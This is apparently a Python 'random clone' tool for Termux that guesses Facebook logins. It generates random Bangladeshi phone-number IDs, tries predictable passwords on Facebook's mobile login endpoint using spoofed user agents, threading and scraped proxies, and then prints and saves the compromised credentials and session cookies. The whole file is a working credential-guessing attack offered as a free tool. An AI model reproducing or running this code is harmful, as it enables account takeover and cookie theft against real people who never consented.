##Created by RAKIB KING
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
#-----------------color------------------
#green
gn ="\033[1;32m"
#purple
pn ="\033[1;35m"
#blow
bn = "\033[1;34m"
#red
rn = "\033[1;31m"
#yello
yn = "\033[1;33m"
#coyn
cn = "\033[1;36m"
#white
wn = "\033[1;37m"
#-------------------------bragraund color -----------------
red = '\033[1;41m'
green = '\033[1;42m'
yellow = '\033[1;43m'
BLUE = '\033[1;34m'
BLUE = '\033[1;34m'
BLUE = '\033[1;34m'
BLUE = '\033[1;34m'
BLUE = '\033[1;34m'
BLUE = '\033[1;34m'



#end color
ed = "\033[1;0m"

BLUE = '\033[1;34m'
BLUE = '\033[1;34m'
BLUE = '\033[1;34m'
BLUE = '\033[1;34m'
BLUE = '\033[1;34m'
BLUE = '\033[1;34m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
#prox=open#('.prox.txt'#,'r'#).read#().splitlines#()
for xd in range(10000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
for ua in range(5000):
      a='Mozilla/5.0 (Linux; Android'
      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
      y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
      c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
      d=random.randrange(40,115)
      e='0'
      f=random.randrange(3000,6000)
      g=random.randrange(20,100)
      h='Mobile Safari/537.36'
      ug=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(ug)
for ua in range(5000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8','9','10','11','12','13','14','15'])
	c='itel S661LP Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
	h='Mobile Safari/537.36'
	naim=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
	ugen.append(naim)
for ua in range(5000):
    a='NokiaX'
    b=random.randrange(1,9)
    c='-0'
    d=random.randrange(1,9)
    e='/'
    f=random.randrange(1,9)
    g='.0 ('
    h=random.randrange(1,12)
    i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
    j='UNTRUSTED/'
    k=random.randrange(1,3)
    l='.0'
    naim=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
    ugen.append(naim)

for ua in range(5000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8','9','10','11','12','13','14','15'])
	y=random.choice(['RMX3571','RMX3511','RMX3461','RMX3741','RMP2107','RMX3572','RMX1921','RMX3121','RMX3121','RMX3350','RMX3511'])
	c='Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
	h='Mobile Safari/537.36'
	naim=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
	ugen.append(naim)
# LOGO
####os.system('espeak -a 300 " Welcome,   to,  RAKIB, KING, TERMUX, HACKING, TIM, Tools, join, My, Facebook, Group"')  
os.system("xdg-open https://m.facebook.com/groups/187986870133162/")
logo = (f'''                                                 
\x1b[1;92m██████╗░░█████╗░██╗░░██╗██╗██████╗░ 
\x1b[1;92m██╔══██╗██╔══██╗██║░██╔╝██║██╔══██╗ 
\x1b[1;92m██████╔╝███████║█████═╝░██║██████╦╝ 
\x1b[1;92m██╔══██╗██╔══██║██╔═██╗░██║██╔══██╗ 
\x1b[1;92m██║░░██║██║░░██║██║░╚██╗██║██████╦╝ 
\x1b[1;92m╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝╚═════╝░
\x1b[33;1;92m====================================================
 \033[1;31m[\033[1;32m[=]\033[1;31m]\033[1;32m DEVELOPER : RAKIB 
 \033[1;31m[\033[1;32m[=]\033[1;31m]\033[1;32m FACEBOOK  : MD RAKIB KING
 \033[1;31m[\033[1;32m[=]\033[1;31m]\033[1;32m TOOLS     : FREE \033[1;37m 
 \033[1;31m[\033[1;32m[=]\033[1;31m]\033[1;32m VERSION   :\033[1;32m \033[1;32m[0.1] 
{gn}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{gn}''')
# MAIN MANU 
def Main():
        os.system("clear")
        print(logo)
        print(" \033[1;31m[\033[1;32m=1=\033[1;31m] \033[1;32mRANDOM CLONE BD")
        print(" \033[1;31m[\033[1;32m=2=\033[1;31m] \033[1;32mCONTACT ADMIN")
        print(" \033[1;31m[\033[1;32m=×️=\033[1;31m] \033[1;32mOK ID 100% & CP ID 30%")
        print(" \033[1;31m[\033[1;32m=0=\033[1;31m] \033[1;32mEXIT")
        print(f"{gn}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"{gn}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        naim =input("\n \033[1;32m[=\033[1;32m] \033[1;32mSELECTED YOUR OPTION = ")
        if naim in ["1","01"]:
            cln()
        if naim in ["2","02"]:
        	os.system('xdg-open https://www.facebook.com/profile.php?id=100088562019366')
        if naim in [" 3", "03"]:
        	#os.system#('xdg-open me.+8801724273808')
          #  cln()
            exit()
        else:
            exit()     
def cln():
    user=[]
    os.system('clear')
    print(logo)
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print('\033[1;32m[=\033[1;32m]\033[1;32m Example = \033[1;32m[\033[1;32m016\033[1;32m]\033[1;32m [\033[1;32m017\033[1;32m] \033[1;32m[\033[1;32m018\033[1;32m] \033[1;32m[\033[1;32m019\033[1;32m]')
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    code = input('\033[1;32m[=\033[1;32m]\033[1;32m YOUR SIM CODE = ')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print('\033[1;32m[=\033[1;32m]\033[1;36m Example = \033[1;32m[\033[1;32m3000\033[1;32m]\033[1;32m [\033[1;32m5000\033[1;32m] \033[1;32m[\033[1;32m10000\033[1;33m] ')
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    limit = int(input('\033[1;32m[=\033[1;32m]\033[1;32m YOUR LIMITED = '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as asha:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print("\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print("\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print('\033[1;31m[=\033[1;31m] \033[1;32mYOUR TOTAL IDS : \033[1;31m'+tl)
        print("\033[1;31m[=\033[1;31m] \033[1;32mYOUR SIM CODE :\033[1;31m "+code)
        print('\033[1;31m[=\033[1;31m]\033[1;32m PLEASE WAIT CLONING START')
        print('\033[1;31m[=\033[1;31m] \033[1;32mSUPER FAST SPEED CLONING')
        print("\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print("\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        for love in user:
            uid = code+name+cod+love
            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh','017017;123456']
            asha.submit(naim,uid,pwx,tl)
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(' [√] Your checking has been complete')
    print(' [√] Thanks for useing my tools- please again try >⁠.⁠<')
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
def naim(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r   \033[1;92m\033[38;5;46mRAKIB=\033[1;97m [%s/%s] = [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(cps),len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'free.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"23021RAAEG"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"13.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
            'viewport-width': '980',}
            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f" {YELLOW} ═━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━═━═━═━═━━═━═━═")
                print(f"\033[38;5;46m ┣[OK-ID] : {uid} ")
                print(f"\033[38;5;46m ┣[OK-ID] : {ps} ")
                print(f"\033[38;5;46m ┣[Cookies] : {coki} ")
                print(f" {YELLOW} ═━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━═━═━═━═━━═━═━═")
                open('/sdcard/RAKIB-OK💚.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[38;5;46m [RAKIB-OK💚] : {uid} [OK] : {ps} ")
                print(f'\033[38;1;32m──────────────────────────────────────────────────\033[1;37m')
                open('/sdcard/RAKIB-OK✅.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        pass
        
Main()
# END #

